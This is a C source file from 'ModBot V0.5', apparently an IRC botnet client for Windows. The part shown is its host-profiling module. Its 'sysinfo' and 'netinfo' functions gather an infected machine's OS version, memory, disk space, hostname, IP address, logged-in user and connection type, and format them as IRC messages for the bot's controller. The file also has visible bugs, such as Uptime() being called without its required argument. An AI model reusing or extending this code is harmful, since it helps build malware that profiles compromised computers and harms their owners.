/////////////////////////////////////////////////
//            120|-[ModBot]-V0.5               //
///////////////////////////////////////////////// 
#include "Inc.h"
#include "Fun.h"
#include "Ext.h"
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
char *Uptime(int startup)
{
	static char buffer[50];

	DWORD total = GetTickCount() / 1000 - startup;
	DWORD days = total / 86400;
	DWORD hours = (total % 86400) / 3600;
	DWORD minutes = ((total % 86400) % 3600) / 60;
	
	_snprintf(buffer, sizeof(buffer), "%dd %dh %dm", days, hours, minutes);

	return (buffer);
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
int OSVersionCheck(void)
{ 
	DWORD dwRet = OS_UNKNOWN;

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if (GetVersionEx(&verinfo)) {
		if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) dwRet = OS_WIN95;
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) dwRet = OS_WINNT;
		}
		else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) dwRet = OS_WIN98;
		else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) dwRet = OS_WINME;
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) dwRet = OS_WIN2K;
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) dwRet = OS_WINXP;
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) dwRet = OS_WIN2K3;
		else dwRet = OS_UNKNOWN;
	} else 
		dwRet = OS_UNKNOWN;

	return (dwRet);
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
BOOL checkos() {

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); 
	GetVersionEx(&verinfo); 

	if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1 && (strstr(verinfo.szCSDVersion, "2") != NULL)) 
		return TRUE;
	else 
		return FALSE;
}
#ifndef NO_SYSINFO
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#pragma warning( disable : 4035 )
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
inline unsigned __int64 GetCycleCount(void)
{
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
}
#pragma warning( default : 4035 )
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
unsigned __int64 GetCPUSpeed(void)
{
	unsigned __int64 startcycle, speed, num, num2;

	do {
		startcycle = GetCycleCount();
		Sleep(1000);
		speed = ((GetCycleCount()-startcycle)/1000000);
	} while (speed > 1000000);

	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return (speed);
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
char *sysinfo(char *sinfo, SOCKET sock)
{
	char *os="", os2[140];
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo); 

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2003";
	else os = "???";

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s (%s)", os, verinfo.szCSDVersion);
		os = os2;
	}

	DWORD cchBuff = 256; 
	char CurrentUser[256]="?";
	if(fGetUserName)
		fGetUserName(CurrentUser, &cchBuff);

	char hostname[250];
	DWORD addr = finet_addr(GetIP(sock));  
	HOSTENT *hostent = fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
    if (hostent != NULL)
       sprintf(hostname,hostent->h_name);
    else 
		sprintf(hostname,"couldn't resolve host");

	char sysdir[MAX_PATH];
    GetSystemDirectory(sysdir,sizeof(sysdir));

    char date[70], time[70];
    GetDateFormat(0x409,0,0,"dd:MMM:yyyy",date,70);
    GetTimeFormat(0x409,0,0,"HH:mm:ss",time,70);

	MEMORYSTATUS memstat;
	memset(&memstat, 0, sizeof(memstat));
	GlobalMemoryStatus(&memstat); 

	char drive[10];
	_splitpath(sysdir, drive, NULL, NULL, NULL);
	DKSPKB dkspkb=DiskSpaceKB(drive);

	_snprintf(sinfo, IRCLINE, "%s [CpU]: %I64uMHz. [RaM] %sKB total, %sKB free. [DiSk] %s total, %s free. [Os] Windows %s (%d.%d, Build %d). [SyS DiR] %s. [HoStNaMe] %s (%s). [CuRrEnT uSeR] %s. [DaTe] %s. [TiMe] %s. [UpTiMe] %s ",
		mn_title, GetCPUSpeed(), commaI64(memstat.dwTotalPhys / 1024), commaI64(memstat.dwAvailPhys / 1024), dkspkb.TotalKB, dkspkb.FreeKB, os, 
		verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, sysdir, hostname, GetIP(sock), CurrentUser, date, time, Uptime());

	return (sinfo); 
}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_NETINFO
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
char *netinfo(char *ninfo, char *host, SOCKET sock)
{
	DWORD n;
	char ctype[8], cname[128];
	memset(cname, 0, sizeof(cname));
	if (!nowininet) {
		if (!fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0))
			sprintf(cname, "Not connected");
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) 
			sprintf(ctype, "Dial-up");
	 	else 
			sprintf(ctype,  "LAN");
	} else {
		sprintf(ctype, "N/A");
		sprintf(cname, "N/A");
	}
	_snprintf(ninfo, IRCLINE, "%s [TyPe] %s (%s). [Ip AdDrEsS] %s. [HoStNaMe] %s.", mn_title, ctype, cname, GetIP(sock), host);

	return (ninfo);
}
#endif
/////////////////////////////////////////////////
//            120|-[ModBot]-V0.5               //
///////////////////////////////////////////////// 